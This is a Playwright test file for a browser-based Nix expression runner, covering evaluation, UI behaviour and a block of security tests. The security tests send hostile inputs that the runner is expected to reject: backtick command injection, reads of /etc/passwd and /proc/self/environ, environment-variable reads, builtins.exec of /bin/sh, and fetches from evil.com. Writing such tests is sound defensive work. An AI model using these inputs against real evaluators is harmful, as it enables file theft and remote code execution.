import type { Page } from "@playwright/test";
import { test, expect } from "@playwright/test";

const BASE_URL = "http://localhost:3000/examples/nix";


const nixInput = (page: Page) => page.locator('input[placeholder="1 + 2"]');
const nixResult = (page: Page) => page.locator('[data-testid="nix-result"]').last();
const nixError = (page: Page) => page.locator('[data-testid="nix-error"]').last();

async function evalExpr(page: Page, expr: string) {
  const input = nixInput(page);
  await input.click();
  await input.clear();
  await input.type(expr, { delay: 20 });
  await input.press("Enter");
}

test.describe("Nix Runner - functional tests", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto(BASE_URL);
    await page.waitForSelector('[data-testid="nix-runner"]', { timeout: 15000 });
    // Wait for Vue hydration
    await page.waitForTimeout(2000);
  });

  test("terminal component renders on nix page", async ({ page }) => {
    await expect(page.locator('[data-testid="nix-runner"]')).toBeVisible();
    await expect(nixInput(page)).toBeVisible();
  });

  test("simple arithmetic: 1 + 2", async ({ page }) => {
    await evalExpr(page, "1 + 2");
    await expect(nixResult(page)).toHaveText("3", { timeout: 10000 });
  });

  test("string expression", async ({ page }) => {
    await evalExpr(page, '"salom"');
    await expect(nixResult(page)).toContainText("salom", { timeout: 10000 });
  });

  test("let-in expression with semicolon", async ({ page }) => {
    await evalExpr(page, "let x = 10; in x * 2");
    await expect(nixResult(page)).toHaveText("20", { timeout: 10000 });
  });

  test("list expression", async ({ page }) => {
    await evalExpr(page, "[ 1 2 3 ]");
    await expect(nixResult(page)).toContainText("1", { timeout: 10000 });
  });

  test("attrset expression", async ({ page }) => {
    await evalExpr(page, '{ name = "nix"; }');
    await expect(nixResult(page)).toContainText("nix", { timeout: 10000 });
  });

  test("builtins.length", async ({ page }) => {
    await evalExpr(page, "builtins.length [ 1 2 3 4 5 ]");
    await expect(nixResult(page)).toHaveText("5", { timeout: 10000 });
  });

  test("string concatenation", async ({ page }) => {
    await evalExpr(page, '"hello" + " " + "world"');
    await expect(nixResult(page)).toContainText("hello world", { timeout: 10000 });
  });

  test("boolean && operator works", async ({ page }) => {
    await evalExpr(page, "true && false");
    await expect(nixResult(page)).toHaveText("false", { timeout: 10000 });
  });

  test("boolean || operator works", async ({ page }) => {
    await evalExpr(page, "false || true");
    await expect(nixResult(page)).toHaveText("true", { timeout: 10000 });
  });

  test("if-then-else", async ({ page }) => {
    await evalExpr(page, 'if 1 > 0 then "ha" else "yoq"');
    await expect(nixResult(page)).toContainText("ha", { timeout: 10000 });
  });

  test("map function", async ({ page }) => {
    await evalExpr(page, "builtins.map (x: x * 2) [ 1 2 3 ]");
    await expect(nixResult(page)).toContainText("2", { timeout: 10000 });
  });

  test("string interpolation with dollar sign", async ({ page }) => {
    await evalExpr(page, 'let name = "nix"; in "hello ${name}"');
    await expect(nixResult(page)).toContainText("hello nix", { timeout: 10000 });
  });

  test("multiple sequential evaluations", async ({ page }) => {
    await evalExpr(page, "1 + 1");
    await expect(nixResult(page)).toHaveText("2", { timeout: 10000 });

    await evalExpr(page, "2 + 2");
    const results = page.locator('[data-testid="nix-result"]');
    await expect(results).toHaveCount(2, { timeout: 5000 });
    await expect(results.last()).toHaveText("4");
  });
});

test.describe("Nix Runner - security tests", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto(BASE_URL);
    await page.waitForSelector('[data-testid="nix-runner"]', { timeout: 15000 });
    // Wait for Vue hydration
    await page.waitForTimeout(2000);
  });

  test("blocks backtick injection", async ({ page }) => {
    await evalExpr(page, "`whoami`");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.readFile", async ({ page }) => {
    await evalExpr(page, "builtins.readFile /etc/passwd");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.readDir", async ({ page }) => {
    await evalExpr(page, "builtins.readDir /tmp");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.fetchurl", async ({ page }) => {
    await evalExpr(page, 'builtins.fetchurl "http://evil.com"');
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.fetchTarball", async ({ page }) => {
    await evalExpr(page, 'builtins.fetchTarball "http://evil.com/a.tar.gz"');
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.getEnv", async ({ page }) => {
    await evalExpr(page, 'builtins.getEnv "HOME"');
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.exec", async ({ page }) => {
    await evalExpr(page, 'builtins.exec [ "/bin/sh" ]');
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.pathExists", async ({ page }) => {
    await evalExpr(page, "builtins.pathExists /etc/passwd");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks import <nixpkgs>", async ({ page }) => {
    await evalExpr(page, "import <nixpkgs> {}");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks /etc/ path access", async ({ page }) => {
    await evalExpr(page, "/etc/passwd");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks /proc/ access", async ({ page }) => {
    await evalExpr(page, "/proc/self/environ");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("blocks builtins.import", async ({ page }) => {
    await evalExpr(page, "builtins.import /tmp/evil.nix");
    await expect(nixError(page)).toContainText("ruxsat etilmagan", { timeout: 10000 });
  });

  test("handles invalid nix syntax gracefully", async ({ page }) => {
    await evalExpr(page, "let in");
    await expect(nixError(page)).toBeVisible({ timeout: 10000 });
  });

  test("handles timeout (infinite recursion)", async ({ page }) => {
    await evalExpr(page, "let f = x: f (x + 1); in f 0");
    await expect(nixError(page)).toBeVisible({ timeout: 15000 });
  });
});

test.describe("Nix Runner - UI tests", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto(BASE_URL);
    await page.waitForSelector('[data-testid="nix-runner"]', { timeout: 15000 });
    // Wait for Vue hydration
    await page.waitForTimeout(2000);
  });

  test("clear button appears after command and clears history", async ({ page }) => {
    // No clear button initially
    await expect(page.locator('[data-testid="nix-clear"]')).not.toBeVisible();

    await evalExpr(page, "1");
    await expect(nixResult(page)).toBeVisible({ timeout: 10000 });

    // Clear button should now exist
    const clearBtn = page.locator('[data-testid="nix-clear"]');
    await expect(clearBtn).toBeVisible();

    // Click clear
    await clearBtn.click();
    await expect(page.locator('[data-testid="nix-result"]')).toHaveCount(0);
  });

  test("input is re-enabled after evaluation", async ({ page }) => {
    await evalExpr(page, "1 + 1");
    await expect(nixResult(page)).toHaveText("2", { timeout: 10000 });
    await expect(nixInput(page)).toBeEnabled();
  });

  test("history navigation with up/down arrows", async ({ page }) => {
    const input = nixInput(page);

    await evalExpr(page, "1 + 1");
    await expect(nixResult(page)).toBeVisible({ timeout: 10000 });

    await evalExpr(page, "2 + 2");
    await expect(page.locator('[data-testid="nix-result"]')).toHaveCount(2, { timeout: 10000 });

    // Up arrow - last command
    await input.press("ArrowUp");
    await expect(input).toHaveValue("2 + 2");

    // Up arrow - first command
    await input.press("ArrowUp");
    await expect(input).toHaveValue("1 + 1");

    // Down arrow - forward
    await input.press("ArrowDown");
    await expect(input).toHaveValue("2 + 2");

    // Down arrow - clear
    await input.press("ArrowDown");
    await expect(input).toHaveValue("");
  });

  test("empty input does nothing on enter", async ({ page }) => {
    await nixInput(page).press("Enter");
    await expect(page.locator('[data-testid="nix-result"]')).toHaveCount(0);
    await expect(page.locator('[data-testid="nix-error"]')).toHaveCount(0);
  });

  test("nix runner does NOT appear on non-nix pages", async ({ page }) => {
    await page.goto("http://localhost:3000/examples/golang");
    await page.waitForLoadState("networkidle");
    await expect(page.locator('[data-testid="nix-runner"]')).not.toBeVisible();
  });
});
